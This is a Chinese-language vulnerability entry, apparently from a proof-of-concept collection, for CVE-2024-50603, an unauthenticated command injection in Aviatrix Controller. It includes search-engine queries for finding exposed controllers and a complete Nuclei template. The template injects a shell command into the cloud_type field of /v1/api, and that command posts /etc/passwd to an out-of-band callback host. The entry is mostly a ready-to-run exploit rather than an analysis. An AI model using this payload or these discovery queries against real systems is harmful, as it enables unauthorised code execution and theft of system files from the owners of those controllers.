# Aviatrix未授权远程代码执行漏洞(CVE-2024-50603)

在 7.1.4191 之前的 Aviatrix Controller 和 7.2.4996 之前的 7.2.x 中发现了问题。由于操作系统命令中使用的特殊元素的中和不当，未经身份验证的攻击者能够执行任意代码。 Shell 元字符可以发送到 cloud_type 中的 /v1/api（对于 list_flightpath_destination_instances），或者发送到 src_cloud_type（对于 Flightpath_connection_test）。

## zoomeye

```javascript
app="Aviatrix Controller"
```

## poc

```yaml
id: CVE-2024-50603

info:
  name: Aviatrix Controller - Remote Code Execution
  author: newlinesec,securing.pl
  severity: critical
  description: |
    An issue was discovered in Aviatrix Controller before 7.1.4191 and 7.2.x before 7.2.4996. Due to the improper neutralization of special elements used in an OS command, an unauthenticated attacker is able to execute arbitrary code. Shell metacharacters can be sent to /v1/api in cloud_type for list_flightpath_destination_instances, or src_cloud_type for flightpath_connection_test.
  reference:
    - https://www.securing.pl/en/cve-2024-50603-aviatrix-network-controller-command-injection-vulnerability/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-50603
    - https://docs.aviatrix.com/documentation/latest/network-security/index.html
    - https://docs.aviatrix.com/documentation/latest/release-notices/psirt-advisories/psirt-advisories.html?expand=true#remote-code-execution-vulnerability-in-aviatrix-controllers
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2024-50603
    cwe-id: CWE-78
    epss-score: 0.00046
    epss-percentile: 0.1845
  metadata:
    verified: true
    max-request: 1
    vendor: aviatrix
    product: controller
    shodan-query:
      - http.title:"aviatrix controller"
      - http.title:"aviatrix cloud controller"
    fofa-query:
      - app="aviatrix-controller"
      - title="aviatrix cloud controller"
    google-query: intitle:"aviatrix cloud controller"
    zoomeye-query: app="Aviatrix Controller"
  tags: cve,cve2024,aviatrix,controller,rce,oast

variables:
  oast: "{{interactsh-url}}"

http:
  - raw:
      - |
        POST /v1/api HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        action=list_flightpath_destination_instances&CID=anything_goes_here&account_name=1&region=1&vpc_id_name=1&cloud_type=1|$(curl+-X+POST+-d+@/etc/passwd+{{oast}})
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        name: http
        words:
          - "http"

      - type: status
        status:
          - 200

      - type: regex
        part: interactsh_request
        regex:
          - 'root:.*:0:0:'
```



## 漏洞来源

- https://github.com/projectdiscovery/nuclei-templates/pull/11460/files